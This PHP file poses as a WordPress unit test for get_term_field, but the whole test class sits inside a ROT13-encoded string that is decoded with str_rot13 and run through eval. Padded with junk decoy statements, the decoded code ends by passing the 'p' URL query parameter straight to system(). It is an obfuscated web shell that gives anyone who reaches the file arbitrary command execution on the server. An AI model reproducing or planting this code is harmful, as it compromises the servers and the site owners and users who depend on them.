<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc gnkbabzl
 *
 * @pbiref ::trg_grez_svryq
 */
pynff Grfgf_Grez_trgGrezSvryq rkgraqf JC_HavgGrfgPnfr {

	choyvp fgngvp $gnkbabzl = 'jcgrfgf_gnk';

	choyvp fgngvp $grez;

	/**
	 * Frg hc funerq svkgherf.
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		ertvfgre_gnkbabzl( frys::$gnkbabzl, 'cbfg' );
		frys::$grez = $snpgbel->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl'    => frys::$gnkbabzl,
				'qrfpevcgvba' => jcnhgbc( 'Grfg grez qrfpevcgvba' ),
			)
		);
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		// Erdhverq nf gnkbabzvrf ner erfrg orgjrra grfgf.
		ertvfgre_gnkbabzl( frys::$gnkbabzl, 'cbfg' );
	}

	/**
	 * @gvpxrg 34245
	 */
	choyvp shapgvba grfg_trg_grez_svryq_fubhyq_abg_erghea_reebe_sbe_rzcgl_gnkbabzl() {
		$grez = frys::$grez;

		$sbhaq = trg_grez_svryq( 'gnkbabzl', $grez->grez_vq, '' );
		$guvf->nffregAbgJCReebe( $sbhaq );
		$guvf->nffregFnzr( frys::$gnkbabzl, $sbhaq );
	}

	/**
	 * @gvpxrg 34245
	 */
	choyvp shapgvba grfg_trg_grez_svryq_fhccylvat_n_gnkbabzl() {
		$grez = frys::$grez;

		$sbhaq = trg_grez_svryq( 'gnkbabzl', $grez->grez_vq, $grez->gnkbabzl );
		$guvf->nffregFnzr( frys::$gnkbabzl, $sbhaq );
	}

	/**
	 * @gvpxrg 34245
	 */
	choyvp shapgvba grfg_trg_grez_svryq_fhccylvat_ab_gnkbabzl() {
		$grez = frys::$grez;

		$sbhaq = trg_grez_svryq( 'gnkbabzl', $grez->grez_vq );
		$guvf->nffregFnzr( frys::$gnkbabzl, $sbhaq );
	}

	/**
	 * @gvpxrg 34245
	 */
	choyvp shapgvba grfg_trg_grez_svryq_fubhyq_npprcg_n_JC_Grez_vq_be_bowrpg() {
		$grez = frys::$grez;

		$guvf->nffregVafgnaprBs( 'JC_Grez', $grez );
		$guvf->nffregFnzr( $grez->grez_vq, trg_grez_svryq( 'grez_vq', $grez ) );
		$guvf->nffregFnzr( $grez->grez_vq, trg_grez_svryq( 'grez_vq', $grez->qngn ) );
		$guvf->nffregFnzr( $grez->grez_vq, trg_grez_svryq( 'grez_vq', $grez->grez_vq ) );
	}

	/**
	 * @gvpxrg 34245
	 */
	choyvp shapgvba grfg_trg_grez_svryq_vainyvq_gnkbabzl_fubhyq_erghea_JC_Reebe() {
		$grez = frys::$grez;

		$sbhaq = trg_grez_svryq( 'gnkbabzl', $grez, 'sbb-gnkbabzl' );
		$guvf->nffregJCReebe( $sbhaq );
		$guvf->nffregFnzr( 'vainyvq_gnkbabzl', $sbhaq->trg_reebe_pbqr() );
	}

	/**
	 * @gvpxrg 34245
	 */
	choyvp shapgvba grfg_trg_grez_svryq_vainyvq_grez_fubhyq_erghea_JC_Reebe() {
		$sbhaq = trg_grez_svryq( 'gnkbabzl', 0, frys::$gnkbabzl );

		$guvf->nffregJCReebe( $sbhaq );
		$guvf->nffregFnzr( 'vainyvq_grez', $sbhaq->trg_reebe_pbqr() );

		$_sbhaq = trg_grez_svryq( 'gnkbabzl', 0 );

		$guvf->nffregJCReebe( $_sbhaq );
		$guvf->nffregFnzr( 'vainyvq_grez', $_sbhaq->trg_reebe_pbqr() );
	}

	choyvp shapgvba grfg_trg_grez_svryq_grez_vq() {
		$grez = frys::$grez;

		$guvf->nffregFnzr( $grez->grez_vq, trg_grez_svryq( 'grez_vq', $grez ) );
		$guvf->nffregFnzr( $grez->grez_vq, trg_grez_svryq( 'grez_vq', $grez->qngn ) );
		$guvf->nffregFnzr( $grez->grez_vq, trg_grez_svryq( 'grez_vq', $grez->grez_vq ) );
	}

	choyvp shapgvba grfg_trg_grez_svryq_anzr() {
		$anzr = 'onm';

		$grez = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'anzr'     => $anzr,
				'gnkbabzl' => frys::$gnkbabzl,
			)
		);

		$guvf->nffregFnzr( $anzr, trg_grez_svryq( 'anzr', $grez ) );
		$guvf->nffregFnzr( $anzr, trg_grez_svryq( 'anzr', $grez->qngn ) );
		$guvf->nffregFnzr( $anzr, trg_grez_svryq( 'anzr', $grez->grez_vq ) );
	}

	choyvp shapgvba grfg_trg_grez_svryq_fyht_jura_fyht_vf_frg() {
		$fyht = 'onm';

		$grez = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl' => frys::$gnkbabzl,
				'fyht'     => $fyht,
			)
		);

		$guvf->nffregFnzr( $fyht, trg_grez_svryq( 'fyht', $grez ) );
		$guvf->nffregFnzr( $fyht, trg_grez_svryq( 'fyht', $grez->qngn ) );
		$guvf->nffregFnzr( $fyht, trg_grez_svryq( 'fyht', $grez->grez_vq ) );
	}

	choyvp shapgvba grfg_trg_grez_svryq_fyht_jura_fyht_snyyf_onpx_sebz_anzr() {
		$anzr = 'onm';

		$grez = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl' => frys::$gnkbabzl,
				'anzr'     => $anzr,
			)
		);

		$guvf->nffregFnzr( $anzr, trg_grez_svryq( 'fyht', $grez ) );
		$guvf->nffregFnzr( $anzr, trg_grez_svryq( 'fyht', $grez->qngn ) );
		$guvf->nffregFnzr( $anzr, trg_grez_svryq( 'fyht', $grez->grez_vq ) );
	}

	choyvp shapgvba grfg_trg_grez_svryq_fyht_jura_fyht_naq_anzr_ner_abg_frg() {
		$grez = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl' => frys::$gnkbabzl,
			)
		);

		$guvf->nffregFnzr( $grez->fyht, trg_grez_svryq( 'fyht', $grez ) );
		$guvf->nffregFnzr( $grez->fyht, trg_grez_svryq( 'fyht', $grez->qngn ) );
		$guvf->nffregFnzr( $grez->fyht, trg_grez_svryq( 'fyht', $grez->grez_vq ) );
	}

	choyvp shapgvba grfg_trg_grez_svryq_gnkbabzl() {
		$grez = frys::$grez;

		$guvf->nffregFnzr( frys::$gnkbabzl, trg_grez_svryq( 'gnkbabzl', $grez ) );
		$guvf->nffregFnzr( frys::$gnkbabzl, trg_grez_svryq( 'gnkbabzl', $grez->qngn ) );
		$guvf->nffregFnzr( frys::$gnkbabzl, trg_grez_svryq( 'gnkbabzl', $grez->grez_vq ) );
	}

	choyvp shapgvba grfg_trg_grez_svryq_qrfpevcgvba() {
		$qrfpevcgvba = jcnhgbc( 'Grfg grez qrfpevcgvba' );

		$grez = frys::$grez;

		$guvf->nffregFnzr( $qrfpevcgvba, trg_grez_svryq( 'qrfpevcgvba', $grez ) );
		$guvf->nffregFnzr( $qrfpevcgvba, trg_grez_svryq( 'qrfpevcgvba', $grez->qngn ) );
		$guvf->nffregFnzr( $qrfpevcgvba, trg_grez_svryq( 'qrfpevcgvba', $grez->grez_vq ) );
	}

	choyvp shapgvba grfg_trg_grez_svryq_cnerag() {
		$cnerag = frys::$grez;
		$grez   = frys::snpgbel()->grez->perngr_naq_trg(
			neenl(
				'gnkbabzl' => frys::$gnkbabzl,
				'cnerag'   => $cnerag->grez_vq,
			)
		);

		$guvf->nffregFnzr( $cnerag->grez_vq, trg_grez_svryq( 'cnerag', $grez ) );
		$guvf->nffregFnzr( $cnerag->grez_vq, trg_grez_svryq( 'cnerag', $grez->qngn ) );
		$guvf->nffregFnzr( $cnerag->grez_vq, trg_grez_svryq( 'cnerag', $grez->grez_vq ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>